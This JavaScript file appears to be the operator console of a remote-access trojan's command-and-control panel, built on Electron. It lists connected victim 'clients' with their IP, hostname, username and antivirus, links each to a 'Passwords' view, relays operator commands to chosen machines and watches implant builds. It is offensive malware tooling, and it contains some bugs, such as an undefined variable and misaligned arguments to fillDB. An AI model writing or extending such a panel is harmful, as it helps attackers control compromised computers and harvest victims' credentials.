// import { io } from "https://cdn.socket.io/4.4.1/socket.io.esm.min.js";
// const socket = io("http://127.0.0.1:55555/relay/", { transports: ["websocket"] });



let clientList = [0, ""]
let index = {
    
    /*
    setStatus: function() {
        let s = document.getElementById("serverstatus").innerHTML
        if (s == "Online") {

        }
    }
    */
    about: function(html) {
        let c = document.createElement("div");
        c.innerHTML = html;
        asticode.modaler.setContent(c);
        asticode.modaler.show();
    },
    updateClientStatus: function(name, status){
        console.log("Client "+ name + ": " + status)
        document.getElementById(name+'Status').src = 'static/imgs/'+status+'.png'
    },    
    addToClientSelect: function(name) {
        let listed = document.getElementsByClassName("ListedClients")
        for (i = 0; i < listed.length; i++) {
            if (listed[i].id != name){
                let div = document.createElement("option");
                div.className = "ListedClient";
                div.id = name + "Listed"
                div.text = name;
                document.getElementById("cList").append(div);
            }
        }            
    },
    qdebug: function(message) {
        index.about(message)
    },
    ensureSelection: function() {        
        var cdiv = document.getElementsByClassName('clientSpan');
        var csel = document.getElementsByClassName('ListedClient');
        for (i = 0; i < cdiv.length; i++) {
            let _temp = cdiv[i].id.replace("Span", "")
            for (ia = 0; ia < csel.length; ia++) {
                index.qdebug(_temp)
                index.qdebug(csel[i].id.replace("Listed", ""))
                if (csel[i].id.replace("Listed", "") !== _temp) {
                    index.addToClientSelect(_temp)
                }
            }
        }
    }, 
    openConsole: function(consoleName){
        var i, tabcontent;
        tabcontent = document.getElementsByClassName("tabcontent");
        for (i = 0; i < tabcontent.length; i++) {
            tabcontent[i].style.display = "none";
        }
        tablinks = document.getElementsByClassName("tablinks");
        for (i = 0; i < tablinks.length; i++) {
            tablinks[i].className = tablinks[i].className.replace(" active", "");
        }
        document.getElementById(consoleName).style = "display:block;";
    },
    addToClientList: function(uid, os, lang){
        let lgnth = clientList.length
        for (i = 0; i < lgnth; i++){
            if (clientList[i] != uid) {
                clientList[clientList.length + 1] = uid
            }
        }
        let cid = uid + 'Span'
        var cdiv = document.getElementsByClassName('clientSpan');
        var exists = 0;		
        for (i = 0; i < cdiv.length; i++) {
            if (cdiv[i].id == cid){
                exists = 1;
            }
        }	
        if (!exists) {
            index.addToClientSelect(uid)
            var clientDiv = document.getElementById("appLogs");
            var addDiv = document.createElement("div")
            var newSpan = document.createElement("span");
            newSpan.className = "clientSpan"
            newSpan.id = uid + "Span";
            //newSpan.onclick = index.openConsole(uid)
            var idA = document.createElement("a")
            idA.style = "color:white"
            idA.innerHTML = "ID:"
            var idAi = document.createElement("a")
            idAi.style = "color:orange"
            idAi.innerHTML = uid
            var brk = document.createElement("br")
            var osimg = document.createElement("img")
            osimg.src = "static/imgs/" + os.replace(" amd64", "") + ".png"
            osimg.width = "25px"
            osimg.height = "25px"
            var langimg = document.createElement("img")
            langimg.width = "25px"
            // langimg.style = "width:25px;height:25px;"
            langimg.height = "25px"
            langimg.src = "static/imgs/" + lang + ".png"
            var statimg = document.createElement("img")
            statimg.src = "static/imgs/active.png"
            statimg.height = "25px"
            statimg.width = "25px"
            // statimg.style = "width:25px;height:25px;"
            statimg.id = uid + "Status"
            newSpan.append(idA)
            newSpan.append(idAi)
            newSpan.append(brk)
            newSpan.append(osimg)
            newSpan.append(langimg)
            newSpan.append(statimg)
            addDiv.append(newSpan)
            clientDiv.append(addDiv)
            // var cConeole = document.getElementById("consoleHolder")
            // var cCon = document.createElement("div")
            // cCon.id = uid + "ConsoleHolder"
            // cCon.className = "tabcontent"
            // cCon.style = "display:none;"
            // var cC = document.createElement("div")
            // cC.id = uid + "Console"
            // cCon.append(cC)
            // cConeole.append(cCon)
            // <div id="' + data.uid + '" class="tabcontent" style="display: none;"><div id="'+data.uid+'Console"></div></div>   
           // $('#clientDiv').append('<span class="clientSpan" id="'+uid+'Span" onclick="updateUID(\''+uid+'\')"><a style="color:white">ID:</a> <a style="color:orange">' + uid + '</a><br>&emsp;<img src="_img/'+os+'.png" width="25px" height="25px" alt="Operating System">&emsp;<img src="_img/'+lang+'.png" height="30px" width="30px" alt="Build Language">&emsp;<img src="_img/active.png" alt="Active" width="30" height="30" id="'+data.uid+'Stat"></span>&ensp;&ensp;');	
        }else{
            index.updateClientStatus(uid, 'active')
        }
    },
    removeFromList: function(uid){
        let cid = uid + 'Span'
        let lid = uid + 'Listed'
        document.getElementById(cid).remove();        
        document.getElementById(lid).remove();
    },
    addToLogs(event, clientTag, data) {
        var logCon = document.getElementById("appLogs")
        let div = document.createElement("div");
        div.className = "log";
        var i = document.createElement("i")
        i.className = "fa fa-log"
        var span = document.createElement("span")
        var info = document.createElement("b")
        info.innerHTML = event
        span.append(info)
        span.innerHTML = clientTag + " : " + data
        div.append(i)
        div.append(span)
        logCon.append(div)
//        div.innerHTML = `<i class="fa fa-log"></i><span><b>` + event + `</b> | ` + clientTag + `:` + data + `</span>`;
       // document.getElementById("logs").appendChild(div)
    },
    init: function() {
        // Init
        asticode.loader.init();
        asticode.modaler.init();
        asticode.notifier.init();
        
        // Wait for astilectron to be ready
        document.addEventListener('astilectron-ready', function() {
            //astilectron.sendMessage({name: "test", payload: "TestPayload"}, function(message) {
            //    console.log("received " + message.payload)
            //});
            // Listen
            index.listen();
            // Process path
            document.getElementById("serverstatus").innerHTML = "&emsp;&emsp;Connected to TeamServer";
            document.getElementById("serverstatus").style = "color:lime;"
        })
    },
    fillDB: function(socketid, version, ipaddr, hostname, username, os, cpu, gpu, memory, antivirus, lang, rec) {
        var list = document.getElementById("clientBody")
        var tr = document.createElement("tr")
        let sd = document.createElement("td")
        sd.append(socketid)
        let vd = document.createElement("td")
        vd.append(version)
        let id = document.createElement("td")
        id.append(ipaddr)
        let hd = document.createElement("td")
        hd.append(hostname)
        let ud = document.createElement("td")
        ud.append(username)
        let od = document.createElement("td")
        od.append(os)
        let cd = document.createElement("td")
        cd.append(cpu)
        let gd = document.createElement("td")
        gd.append(gpu)
        let md = document.createElement("td")
        md.append(memory)
        let ad = document.createElement("td")
        ad.append(antivirus)
        let ld = document.createElement("td")
        ld.append(lang)
        let rd = document.createElement("td")
        rd.innerHTML = "<a onclick=\"showPass('" + socketid + "')\">Passwords</a>"
      //  rd.append(rec)
        tr.append(sd)
        tr.append(vd)
        tr.append(id)
        tr.append(hd)
        tr.append(ud)
        tr.append(od)
        tr.append(cd)
        tr.append(gd)
        tr.append(md)
        tr.append(ad)
        tr.append(ld)
        tr.append(rd)
        list.append(tr)
       // index.addToClientList(socketid, os, "golang")
    },
    sendCommand: function(args, client) {
        asticode.loader.show();
        let send = args + "#" + client
        console.log(send)
        astilectron.sendMessage({
            name: "toClient", 
            payload: send
        }, function(message) {
            // Init
            setTimeout(asticode.loader.hide(), 2500)

            // Check error
        })
    }, 
    createTableHor: function(data){
        let body = document.getElementById("clientBody")
        let row = document.createElement("tr")
        // td | 11 items
        count = 0;
        data.forEach(element => {
            if (!element.includes(undefined)){
                count++;
                if (count < 11){
                    let dataLine = element
                    let insertValue = dataLine.split(':')[1]
                    let td = document.createElement("td")
                    td.append(insertValue)
                    row.append(td)
                }
            }
        })
        body.append(row)
    },
    listen: function() {
        astilectron.onMessage(function(message) {
            console.log(message)
            switch (message.name) {
                case "about":
                    index.about(message.payload);
                    return {payload: "payload"};
                    break;
                case "error":
                    let d = message.payload.split('::')
                    index.addToLogs("error", d[0], d[1])
                    break;
                case "registration":
                    let info = message.payload;
                    index.fillDB(info.socketid, info.tag, info.version, info.ipaddr, info.hostname, info.username, info.os + " " + info.arch, info.cpu, info.gpu, info.memory, info.antivirus)
                    asticode.notifier.success("New Client has connected: " + info.ipaddr)
                    return {payload: "payload"};
                case "newClient":
                    let dataIn = message.payload;
                    console.log("New CLient event reached the server")
                    index.addToLogs(message.name, "Client tag: " + newC[0])
                    return {payload: "payload"};
                case "cList":
                    index.addToClientSelect(message.payload)
                    return {payload: "payload"};
                case "discon":
                    var dis = message.payload
                    console.log(dis)
                    asticode.notifier.error(dis)
                    return {payload: "payload"};
                  //  index.removeFromList(dis)
                case "notify":
                    index.about(message.payload)
                    return {payloaf: "payload"}
                case "online":
                    document.getElementById("serverstatus").innerHTML = "Online";
                    document.getElementById("serverstatus").style.color = "lime";
                    return {payload: "payload"};
                case "ClientInfo":
                    console.log("ClientInfo event recieved")
                    break;
                case "response":
                    let resp = message.payload.split("|");
                    let tag = resp[0];
                    let data = resp[1];
                    index.about(resp);
                    break;
            }
        });
    },
    buildwatch: function() {
        astilectron.onMessage(function(message) {
            switch (message.name) {
                case "build":
                    index.about(message.payload);
                    return {payload: "payload"};
                    break;
            }
        });
    },
};